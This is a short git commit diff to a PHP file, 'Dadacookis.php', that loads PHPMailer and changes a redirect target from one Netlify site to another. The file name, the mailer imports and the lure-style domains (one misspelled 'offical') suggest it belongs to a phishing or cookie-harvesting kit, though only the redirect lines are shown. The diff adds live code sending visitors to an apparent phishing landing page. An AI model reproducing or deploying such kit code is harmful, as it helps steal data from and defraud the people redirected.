02a1e8dce97647dad212fd57ced88a7155e25700
Lernamzaxal892 <lernayouamzaxal@gmail.com>
2025-08-12 15:01:00 +0500

    Update Dadacookis.php

--- Dadacookis.php
+++ Dadacookis.php
@@ -2,7 +2,7 @@
 use PHPMailer\PHPMailer\PHPMailer;
 use PHPMailer\PHPMailer\Exception;
 
-header("Location: https://offical-apply-more-data.netlify.app/");
+header("Location: https://request-for-submission.netlify.app/");
 
 require 'Exception.php'; 
 require 'PHPMailer.php';
